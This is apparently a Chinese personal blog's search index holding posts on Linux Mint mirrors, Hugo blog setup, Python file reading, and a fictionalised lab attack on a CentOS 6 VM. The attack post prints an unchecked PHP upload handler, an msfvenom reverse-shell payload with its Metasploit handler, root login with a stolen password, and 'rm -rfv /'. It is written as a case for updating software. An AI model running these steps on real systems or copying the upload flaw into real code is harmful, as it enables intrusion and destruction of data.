语言","作业","帮做","示例"],"title":"帮做大学计算机作业","uri":"/zh-cn/posts/%E5%B8%AE%E5%81%9A%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%9C%E4%B8%9A/"},{"categories":["Linux"],"content":"For Green Hands","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"序 由于 Linux Mint 在安装完之后.. 唔啊！ 不许笑！！ 我我我当然早就会！写给萌新看的！喂！不许笑！！ 默认的软件源是官方的，在安装软件包和更新的时候得 跨过山河大海，也要穿过人山人海 ，因此我们得把它修改为离我们最近的镜像源 对于 Mint 来说，无非就两种办法 注意：二选一 ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:1:0","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"一、终端法 我们先去 TUNA 镜像站看看帮助文档 内容是这样的 嗯… 也许你看不太懂，具体怎么操作… 首先把鼠标移到左下角，打开终端 就是封面上那个东西.. 我们先要编辑 /etc/apt/sources.list 这个文件。 Mint 似乎不自带 vim，所以我们这里使用 nano。 $ sudo nano /etc/apt/sources.list 注意：sudo 不能丢！ 而且按下回车之后要输入密码才能有权限。 我们打开才发现里面是空的，除了一大堆英文注释什么都没有.. 我们往里面写入 deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport 接下来还不够，因为 Mint 还有一些包要使用 Ubuntu 的仓库，所以我们再看看 Ubuntu 的帮助文档 我知道怎么做了，把这些当中的archive.ubuntu.com 等域名全部改成mirrors.tuna.tsinghua.edu.cn 即可 #deb cdrom:[Linux Mint 20 _Ulyana_ - Release amd64 20200624]/ focal contrib main # This system was installed using small removable media # (e.g. netinst, live or single CD). The matching \"deb cdrom\" # entries were disabled at the end of the installation process. # For information about how to configure apt package sources, # see the sources.list(5) manual. deb http://mirrors.tuna.tsinghua.edu.cn/linuxmint/ ulyana main upstream import backport deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-updates main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-backports main restricted universe multiverse deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse 如图： 接下来，执行 $ sudo apt update 就会比最开始快很多了 ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:2:0","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"二、使用自带的更新管理器 首先点击开始菜单，找到设置管理器 滚轮滑下去，找到软件源 输入你的用户密码 嗯哼，是不是在开头看到过？ 然后用这个软件把这些都改成国内的就好了，具体怎么操作… 我也不好讲啊… 唔啊！总之这个就是… 拿鼠标点点点就好了… 总之这样就好啦～ 接下來它会提示你是否更新 apt 缓存，点击确定就可以啦～ 等它跑完就好啦～ ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:3:0","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"更新软件包 当我们设置好 apt 软件源后，我们要做的就是进行必要的软件包更新.. 还是两种方法 注意：还是二选一 ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:4:0","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"一、终端法 $ sudo apt upgrade 搞定 接下来重启虚拟机就可以了 ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:4:1","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"二、使用这个更新管理器 点击就好～ 然后输入密码就可以了 点击安装更新就好了 确定 截图累死了… 然后等它跑完就好了 接下来重启虚拟机就可以了 ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:4:2","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"结语 首先要说的是，我是使用 Linux Mint 20 来演示的，在未来它会更新，也许本文章的有些细节与实情不相同，但操作是大同小异的。请根据实际情况随机应变。 其次，不许笑 ，本文章是面向刚接触 Linux 的初学者，不喜勿喷。 如果有什么不足之处，或一些粗心造成的小错误，请在下面的 gitalk 中留言 最后，本站遵循 CC-BY-NC 4.0 协议，转载请注明出处 ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:5:0","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Linux"],"content":"参考链接 linuxmint | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror ubuntu | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror ","date":"2020-11-06","objectID":"/zh-cn/posts/2020-nov-6/:6:0","tags":["教程","Linux Mint","修改软件源 ","Linux 入门","apt"],"title":"Linux Mint 如何修改软件源","uri":"/zh-cn/posts/2020-nov-6/"},{"categories":["Web"],"content":"利用 Github Pages 和 Hugo 框架搭建博客。","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"序 去年写过一篇如何使用GitHub搭建网站，利用 Github Pages 上传自己写的 HTML 文件来运行一个网页.. 嘛.. 搭建博客的话，手写 HTML CSS JS 太麻烦了… 怎么办？用框架呀 qwq 我建议用 Hugo… 个人觉得最简单 正好有个朋友的博客要重建.. ","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:1:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"注册 Github 首先你得有个 Github 帐号和一个能在 Github Pages 显示的库。 去年那篇已经写清楚了如何注册 Github 帐号以及创建 Github Pages 库，这里就不再重复了。 总之你需要有一个 Github 帐号，然后创建一个名字为这样的库，记得勾选 Public 你的GitHub用户名.github.io ","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:2:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"安装 Hugo 接下来安装 Hugo Arch $ sudo pacman -S hugo deb 系 $ sudo apt install hugo Windows 到 Github下载安装程序即可 ","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:3:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"生成一个博客 我以 Linux 为例，其他平台可能有些细节不同，请注意 打开你的终端，输入 $ hugo new site test 接下来你的终端会返回一些这样的文字 Congratulations! Your new Hugo site is created in /home/weepingdogel/test. Just a few more steps and you're ready to go: 1. Download a theme into the same-named folder. Choose a theme from https://themes.gohugo.io/ or create your own with the \"hugo new theme \u003cTHEMENAME\u003e\" command. 2. Perhaps you want to add some content. You can add single files with \"hugo new \u003cSECTIONNAME\u003e/\u003cFILENAME\u003e.\u003cFORMAT\u003e\". 3. Start the built-in live server via \"hugo server\". Visit https://gohugo.io/ for quickstart guide and full documentation. 这个时候你也许知道怎么做了，如果看不太懂英文呢，用 Google Translate 翻译一下: 恭喜你！ 您的新Hugo网站是在/ home / weepingdogel / test中创建的。 仅需执行几个步骤，您就可以开始： 1.将主题下载到同名文件夹中。 从https://themes.gohugo.io/中选择一个主题 使用“ hugo新主题\u003cTHEMENAME\u003e”命令创建自己的命令。 2.也许您想添加一些内容。 您可以添加单个文件 和“ hugo new \u003cSECTIONNAME\u003e / \u003cFILENAME\u003e。\u003cFORMAT\u003e”。 3.通过“ hugo服务器”启动内置实时服务器。 请访问https://gohugo.io/以获取快速入门指南和完整文档。 好的，接下来我们前往 https://themes.gohugo.io/ 找一个好看的主题。 这里有很多主题，qwq。 嗯… 因人而异，每个人喜欢的都不同。 而且各种主题的配置方式也不同，我以 hugo-coder 为例 进入 hugo 目录 $ cd test 查看里面的文件 $ ls -lh 总用量 28K drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 archetypes/ -rw-r--r-- 1 weepingdogel weepingdogel 82 10月 22 13:23 config.toml drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 content/ drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 data/ drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 layouts/ drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 static/ drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 themes/ 我们只需要记住这几个目录 config.toml 博客的配置文件，全局配置 static 静态资源文件，你的图片什么的就可以直接放在这里 content 你写的文章会存储在这个目录下的 posts\\ 目录下，其他页面也是在这个目录下 themes 这个是你放主题的目录 public 生成出来的静态文件 然后我们.. 执行这些 $ cd theme $ git clone https://github.com/luizdepra/hugo-coder.git $ cd .. 接下来将主题里面的 examplesite/config.toml 复制到 hugo 目录 $ cp ./themes/hugo-coder/exampleSite/config.toml ./ -v 还要将 examplesite/content 目录下的东西也复制到外面这个 content 目录里面 $ cp -rv ./themes/hugo-coder/exampleSite/content/* content/ 启动本地预览服务器 $ hugo server 然后通过浏览器访问 http://127.0.0.1:1313/ 即可预览 这样一来，博客在本地就可以访问了，算是成功了一半。 你可以修改config.toml这个文件来更改你的博客配置 $ vim config.toml baseurl = \"http://www.example.com\" title = \"johndoe\" # 博客标题 theme = \"hugo-coder\" # 主题名称，不需要动 languagecode = \"en\" # 语言，默认英文.. defaultcontentlanguage = \"en\" # 同上 paginate = 20 pygmentsstyle = \"b2\" pygmentscodefences = true pygmentscodefencesguesssyntax = true disqusShortname = \"yourdiscussshortname\" ## 基本信息，自己谷歌翻译吧... qwq [params] author = \"John Doe\" description = \"John Doe's personal website\" keywords = \"blog,developer,personal\" info = \"Full Stack DevOps and Magician\" avatarurl = \"images/avatar.jpg\" #gravatar = \"john.doe@example.com\" footercontent = \"Enter a text here.\" dateformat = \"January 2, 2006\" hideFooter = false hideCredits = false hideCopyright = false since = 2019 # Git Commit in Footer，取消注释下面的行以启用它。 commit = \"https://github.com/luizdepra/hugo-coder/tree/\" rtl = false # Specify light/dark colorscheme # Supported values: # \"auto\" (use preference set by browser) # \"dark\" (dark background, light foreground) # \"light\" (light background, dark foreground) (default) colorscheme = \"auto\" # 隐藏切换按钮以及相关的垂直分隔线 hidecolorschemetoggle = false # 系列，另见帖子数 maxSeeAlsoItems = 5 # 启用Twemoji enableTwemoji = true # 自定义CSS customCSS = [] # 自定义SCSS customSCSS = [] # 自定义JS customJS = [] # 如果要使用 fathom（https://usefathom.com）进行分析，请添加此部分 [params.fathomAnalytics] siteID = \"ABCDE\" # 默认值为cdn.usefathom.com，如果您是自托管主机，则将其覆盖 serverURL = \"analytics.example.com\" # 如果要使用 plausible（https://plausible.io）进行分析，请添加此部分 [params.plausibleAnalytics] domain = \"example.com\" # 默认值为plausible.io，如果您是自托管或使用自定义域，请覆盖此默认值 serverURL = \"analytics.example.com\" # 如果要使用山羊计数（https://goatcounter.com）进行分析，请添加此部分 [params.goatCounter] code = \"code\" [taxonomies] category = \"categories\" series = \"series\" tag = \"tags\" author = \"authors\" [[params.social]] name = \"Github\" icon = \"fa fa-github\" weight = 1 url = \"https://github.com/johndoe/\" [[params.social]] name = \"Gitlab\" icon = \"fa","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:4:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"写博客 首先我们需要创建一个 *.md 文件，我们可以用 hugo new 来生成一个，因为不同主题它的空白格式都不一样 这个是本站的空白格式 --- title: \"Test\" date: 2020-10-22T17:08:31+08:00 draft: true --- 这个是 coder 主题的空白格式 +++ draft = true date = 2020-10-22T17:09:47+08:00 title = \"\" description = \"\" slug = \"\" authors = [] tags = [] categories = [] externalLink = \"\" series = [] +++ 还是有区别的对吧，因此我们需要这样子 $ hugo new posts/helloworld.md 如果终端返回一条这样的信息: /home/weepingdogel/test/content/posts/helloworld.md created 就说明文件建立成功了，接下来只需要编辑这个文件就可以写了～ 对了，写博客需要使用 MarkDown 语法，如果不了解的可以点击链接学一下哦～ 我就象征性的随便写一个吧～ +++ draft = false date = 2020-10-22T17:09:47+08:00 title = \"HELLO WORLD\" description = \"\" slug = \"\" authors = [] tags = [] categories = [] externalLink = \"\" series = [] +++ ## Hello World **It's my first blog!** \u003e```c \u003e #include\u003cstdio.h\u003e \u003e int main(){ \u003e printf(\"Hello World\"); \u003e return 0; \u003e} \u003e``` 记得把 draft 后面的内个改成 false 哦，不然它会被默认识别为草稿，不会被发布的。 ","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:5:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"发布到 Github 写完了以后，我们发现现在只能在127.0.0.1：1313这个本地链接中预览，别人是看不到的。 接下來我们还得把它放到 Github 上去才行。 先生成静态文件 $ hugo --theme=hugo-coder 返回出以下内容 Start building sites … | EN | PT-BR -------------------+----+-------- Pages | 57 | 25 Paginator pages | 0 | 0 Non-page files | 0 | 0 Static files | 0 | 0 Processed images | 0 | 0 Aliases | 21 | 9 Sitemaps | 2 | 1 Cleaned | 0 | 0 Total in 237 ms 进入 public 目录 $ cd public/ 接下來我们需要做的就是把这个目录里所有文件 pull 到 你的GitHub用户名.github.io 这个库里面去，其实很简单.. 初始化仓库 $ git init 添加文件 $ git add -A 作出提交请求 $ git commit -m \"随便写点啥\" 添加你的 Github 仓库地址 $ git remote add origin https://github.com/你的Github用户名/你的Github用户名.github.io.git 使用 http 的方式提交 $ git push -u origin master 接下來输入你的帐号密码，就会自动提交到仓库了，接下來等一会儿，你的博客就能通过这个链接被访问了。 https://你的Github用户名.github.io/ ","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:6:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"结语 这个坑终于填完了。 对，这次也是很水的，而且还偷懒了，写得不太详细，看完还是不会的，在下面留言就好.. qwq ","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:7:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["Web"],"content":"参考链接 Hugo Documentation | Hugo Complete List | Hugo Themes Hugo Coder | Hugo Themes Configurations · luizdepra/hugo-coder Wiki · GitHub Markdown 教程 | 菜鸟教程 ","date":"2020-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/:8:0","tags":["笔记","Hugo","Github Pages","博客","建站","blog","Website"],"title":"如何使用 GitHub 搭建博客","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/"},{"categories":["渗透测试"],"content":"关于更新的意义...","date":"2020-09-26","objectID":"/zh-cn/posts/2020-09-26/","tags":["Linux","想法","随笔","渗透测试","社工","黑客","更新"],"title":"攻击 CentOS6 虚拟机","uri":"/zh-cn/posts/2020-09-26/"},{"categories":["渗透测试"],"content":" 虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。 ","date":"2020-09-26","objectID":"/zh-cn/posts/2020-09-26/:0:0","tags":["Linux","想法","随笔","渗透测试","社工","黑客","更新"],"title":"攻击 CentOS6 虚拟机","uri":"/zh-cn/posts/2020-09-26/"},{"categories":["渗透测试"],"content":"序 最近总听到一些声音。 一些关于软件更新的、不同的声音。 一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写 另一边说：持续不断的更新才能带来更好的体验 我不知道哪一边是对的，但有点好奇 我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。 只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。 ","date":"2020-09-26","objectID":"/zh-cn/posts/2020-09-26/:1:0","tags":["Linux","想法","随笔","渗透测试","社工","黑客","更新"],"title":"攻击 CentOS6 虚拟机","uri":"/zh-cn/posts/2020-09-26/"},{"categories":["渗透测试"],"content":"模拟环境 攻击者平台: Arch Linux IP: 192.168.0.109 受害平台: CentOS 6.1 on VirtualBox IP: 192.168.0.116 假如这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统） 我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。 由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。 外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样 \u003c?php if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"错误：\" . $_FILES[\"file\"][\"error\"] . \"\u003cbr\u003e\"; } else { echo \"上传文件名: \" . $_FILES[\"file\"][\"name\"] . \"\u003cbr\u003e\"; echo \"文件类型: \" . $_FILES[\"file\"][\"type\"] . \"\u003cbr\u003e\"; echo \"文件大小: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" kB\u003cbr\u003e\"; echo \"文件临时存储的位置: \" . $_FILES[\"file\"][\"tmp_name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $_FILES[\"file\"][\"name\"]); echo \"文件存储在: \" . \"upload/\" . $_FILES[\"file\"][\"name\"]; } ?\u003e 由于条件有限，只能模拟到这个程度，但我个人认为足以进行抽象测试了(逃 ","date":"2020-09-26","objectID":"/zh-cn/posts/2020-09-26/:2:0","tags":["Linux","想法","随笔","渗透测试","社工","黑客","更新"],"title":"攻击 CentOS6 虚拟机","uri":"/zh-cn/posts/2020-09-26/"},{"categories":["渗透测试"],"content":"攻击过程 总有人喜欢搞破坏，一名黑客对服务器进行了扫描… $ sudo nmap -O -v 192.168.0.116 结果是这样的 Nmap scan report for 192.168.0.116 Host is up (0.00028s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 2.6.X|3.X OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 OS details: Linux 2.6.32 - 3.10 Uptime guess: 49.708 days (since Sat Aug 8 02:56:12 2020) Network Distance: 1 hop TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Read data files from: /usr/bin/../share/nmap OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB) 他惊讶地发现内核版本居然才 2.6.32，这样的事他还是第一次见。 除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。 他试图访问了网站，在网站上发现了一个文件上传点。 抱着试试看的态度，用 msf 生成了一个 payload $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php 选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置 于是他启动了 msfconsole $ msfconsole 并使用 exploit/multi/handler 这个模块 msf5 \u003e use exploit/multi/handler 依次设置好参数 msf5 exploit(multi/handler) \u003e set LHOST 192.168.0.109 msf5 exploit(multi/handler) \u003e set LPORT 4444 set payload php/meterpreter/reverse_tcp 最后一步就是运行模块了， msf5 exploit(multi/handler) \u003e run 然后 msf 开始监听。 [*] Started reverse TCP handler on 192.168.0.109:4444 这时他将提示出的文件地址和链接改一下，并访问 http://192.168.0.116/upload/shell.php msf 立刻就有了结果，可想而知，服务器的安全措施有多差 [*] Started reverse TCP handler on 192.168.0.109:4444 [*] Sending stage (38288 bytes) to 192.168.0.116 [*] Meterpreter session 1 opened (192.168.0.109:4444 -\u003e 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800 meterpreter \u003e 现在他开始获取系统简要信息 系统、内核版本 meterpreter \u003e sysinfo Computer : localhost OS : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64 Meterpreter : php/linux meterpreter \u003e cat /etc/issue CentOS release 6.10 (Final) Kernel \\r on an \\m 当前控制的用户权限 meterpreter \u003e getuid Server username: apache (48) 权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。 由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。 看起来他需要想想其他办法。 他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。 一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。 上面写着一些数字和字母，也许是什么有用的东西。 趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。 比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。 下班后回到终端，尝试着用偷窥来的密码直接登陆 root meterpreter \u003e shell Process 1376 created. Channel 2 created. 获得交互 shell /bin/sh -i sh: no job control in this shell sh-4.1$ python -c 'import pty;pty.spawn(\"/bin/bash\")' python -c 'import pty;pty.spawn(\"/bin/bash\")' bash-4.1$ 进行登录 bash-4.1$ su root su root Password: ************ [root@localhost upload]# 可见，一口气便登录成功，root 权限到了他的手里。 [root@localhost upload]# whoami whoami root [root@localhost upload]# id id uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0 [root@localhost upload]# 接下来他便可以为所欲为了.. 对，他最后进行了删库 [root@localhost upload]# rm -rfv / 最后导致公司损失巨大.. ","date":"2020-09-26","objectID":"/zh-cn/posts/2020-09-26/:3:0","tags":["Linux","想法","随笔","渗透测试","社工","黑客","更新"],"title":"攻击 CentOS6 虚拟机","uri":"/zh-cn/posts/2020-09-26/"},{"categories":["渗透测试"],"content":"结语 虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。 但却值得我们思考，就我们能看到的来看… 系统不更新容易被攻击 代码不更新容易出漏洞 密码更新太慢容易泄露 漏洞以更新来修复，不修则被利用 而我们看不到的… 软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？ 不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。 而不能站立不动甚至往回走。 物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。 甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了.. 以上，只是个人想法，若有不当之处，请在下面的评论插件中 喷我 纠正。 ","date":"2020-09-26","objectID":"/zh-cn/posts/2020-09-26/:4:0","tags":["Linux","想法","随笔","渗透测试","社工","黑客","更新"],"title":"攻击 CentOS6 虚拟机","uri":"/zh-cn/posts/2020-09-26/"},{"categories":["编程"],"content":"Python 学习笔记，一些读写文件的基础","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"文件操作 ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:0","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"open open() 是 Python 进行文件操作的关键函数，它有连个参数需要设置 文件名 - 文件的名称，不多解释 模式 - 决定打开的文件是否可读写以及其他属性 open('filename','mode') ","date":"2020-09-05","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:1:1","tags":["笔记","Linux","Python","编程"],"title":"Python 学习笔记——文件操作","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["编程"],"content":"读 仅以只读方式打开一个文件 f = open(\"filename.txt\") 这样写也是一样的 f = open(\"filename\",\"rt\") “r” 表示读 “t” 表示文本，这是函数默认设定好的，所以可以省略。 这里引入一下 w3school 的一个列表 There are four different methods (modes) for opening a file: “r” - Read - Default value. Opens a file for reading, error if the file does not exist “a” - Append - Opens a file for appending, creates the file if it does not exist “w” - Write - Opens a file for writing, creates the file if it does not exist “x” - Create - Creates the specified file, returns an error if the file exists In addition you can specify if the file should be handled as binary or text mode “t” - Text - Default value. Text mode “b” - Binary - Binary mode (e.g. images) 以一个文件举例 /home/weepingdogel/test.txt --- Hello!I love Python. 我们不写 mode 参数： f = open('test.txt') print(f.read()) 执行后： weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. 我们将它加上： f = open('test.txt', 'rt') print(f.read()) 执行后： weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. 结果是一模一样的。 读行 文件: /home/weepingdogel/test.txt --- Hello!I love Python. Have a nice day! Good luck! 当我们遇到一个多行文件的时候，我们可以选择只读取它其中一行 f.readline() 例如: f = open('test.txt') print(f.readline()) 执行后： weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. 我们需要两行的时候： f = open('test.txt') print(f.readline()) print(f.readline()) 执行后： weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! 如果我们需要三行： f = open('test.txt') print(f.readline()) print(f.readline()) print(f.readline()) 执行后： weepingdogel@WeepingDogel ~\u003e python test.py Hello!I love Python. Have a nice day! Good luck! 